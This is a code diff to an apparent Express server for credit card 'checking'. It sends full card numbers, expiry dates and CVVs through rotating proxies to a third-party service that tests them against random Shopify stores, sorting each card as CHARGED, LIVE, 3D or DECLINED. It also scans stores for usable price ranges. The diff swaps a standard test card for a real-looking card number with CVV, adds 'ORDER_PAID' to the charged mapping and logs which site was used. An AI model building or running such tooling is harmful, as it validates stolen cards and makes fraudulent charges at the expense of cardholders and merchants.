@@ -108,8 +108,6 @@ app.delete('/api/proxies', (req, res) => {
 });
 
 // ─── SITE CHECKER (BOTH SCRAPE & API) ───
-
-// 1. The standard Scrape Checker (Products.json)
 app.post('/api/check-sites-advanced', async (req, res) => {
   const { sites, minPrice, maxPrice } = req.body;
   if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });
@@ -178,15 +176,14 @@ app.post('/api/check-sites-advanced', async (req, res) => {
   res.json({ success: true, cleanSites });
 });
 
-// 2. The new API Checker (Uses yzio.app API with generated test card)
 app.post('/api/check-sites-api', async (req, res) => {
   const { sites, minPrice, maxPrice } = req.body;
   if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });
 
   const cleanSites = [];
-  const testCard = '4111111111111111|12|2030|123'; // Standard test card
+  const testCard = '5137415838183486|06|2030|633';
   
-  for (let i = 0; i < sites.length; i += 5) { // API handles slightly faster
+  for (let i = 0; i < sites.length; i += 5) {
     const batch = sites.slice(i, i + 5);
     await Promise.all(batch.map(async (s) => {
       let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
@@ -210,8 +207,8 @@ app.post('/api/check-sites-api', async (req, res) => {
         const response = await axios.get(targetUrl.toString(), options);
         const data = response.data;
         
-        // The API returns a Price field for the site
         const sitePrice = parseFloat(data.Price);
+        
         if (!isNaN(sitePrice) && sitePrice > 0) {
           if (sitePrice >= minPrice && sitePrice <= maxPrice) {
             cleanSites.push({ domain, price: sitePrice.toFixed(2), method: 'API' });
@@ -223,13 +220,12 @@ app.post('/api/check-sites-api', async (req, res) => {
   res.json({ success: true, cleanSites });
 });
 
-// Save Sites (Import to Config)
 app.post('/api/save-sites', (req, res) => {
   const { sites } = req.body;
   if (!sites || !sites.length) return res.json({ success: true, total: db.sites.length });
   
   sites.forEach(newSite => {
-    const domain = newSite.domain || newSite; // handle string or object
+    const domain = newSite.domain || newSite;
     const price = newSite.price || 'N/A';
     if (!db.sites.find(x => x.domain === domain)) {
       db.sites.push({ domain, price, currency: 'USD' });
@@ -285,14 +281,16 @@ async function checkCardWithRetry(cc) {
     let proxyUrl = proxyStr ? formatProxy(proxyStr) : null;
 
     const siteObj = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : { domain: 'shopify.com' };
+    const siteDomain = siteObj.domain; // SAVE THE SITE DOMAIN
+    
     const targetUrl = new URL('https://check.yzio.app/shopify');
-    targetUrl.searchParams.append('site', siteObj.domain);
+    targetUrl.searchParams.append('site', siteDomain);
     targetUrl.searchParams.append('cc', cc);
     if (db.apiKey && db.apiKey.trim() !== '') targetUrl.searchParams.append('key', db.apiKey.trim());
     if (proxyStr) targetUrl.searchParams.append('proxy', proxyStr);
 
     try {
-      const options = { timeout: 20000 };
+      const options = { timeout: 25000 };
       if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
       
       const response = await axios.get(targetUrl.toString(), options);
@@ -303,7 +301,10 @@ async function checkCardWithRetry(cc) {
         await new Promise(r => setTimeout(r, 2000));
         continue; 
       }
-      return { success: true, data };
+      
+      // RETURN THE SITE DOMAIN ALONG WITH DATA
+      return { success: true, data, site: siteDomain }; 
+      
     } catch (err) {
       if (proxyStr && (err.code === 'ECONNABORTED' || err.message.includes('connect'))) {
         db.proxies = db.proxies.filter(p => p !== proxyStr);
@@ -323,6 +324,8 @@ async function processUserTask(email) {
     
     if (result.success) {
       const data = result.data;
+      const site = result.site; // GET THE SITE DOMAIN
+      
       let apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
       let isSuccess = data.Status === true;
       let gateway = data.Gateway || '';
@@ -331,17 +334,23 @@ async function processUserTask(email) {
       let displayLabel = 'UNKNOWN';
       let uiStatus = 'unknown';
 
-      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) { displayLabel = 'CHARGED'; uiStatus = 'charged'; }
-      else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) { displayLabel = 'LIVE'; uiStatus = 'live'; }
-      else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) { displayLabel = 'DECLINED'; uiStatus = 'declined'; }
-      else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) { displayLabel = '3D'; uiStatus = 'otp'; }
-      else if (apiResponse) { displayLabel = apiResponse.substring(0, 12); }
+      // STRICT MAPPING LOGIC (Added ORDER_PAID)
+      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS') || apiResponse.includes('ORDER_PAID')) { 
+        displayLabel = 'CHARGED'; uiStatus = 'charged'; 
+      } else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT')) { 
+        displayLabel = 'LIVE'; uiStatus = 'live'; 
+      } else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION') || apiResponse.includes('REQUIRED_ARTIFACTS_UNAVAILABLE')) { 
+        displayLabel = '3D'; uiStatus = 'otp'; 
+      } else { 
+        displayLabel = 'DECLINED'; uiStatus = 'declined'; 
+      }
 
       let message = apiResponse;
       if (gateway) message = `${gateway} - ${apiResponse}`;
       if (price) message += ` ($${price})`;
 
-      const entry = { id: Date.now() + Math.random(), cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString() };
+      // INCLUDE SITE IN THE ENTRY
+      const entry = { id: Date.now() + Math.random(), cc, site, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString() };
       task.results.push(entry);
       
       db.activity.unshift({ user: email, action: 'check', card: cc, result: uiStatus, time: entry.time });
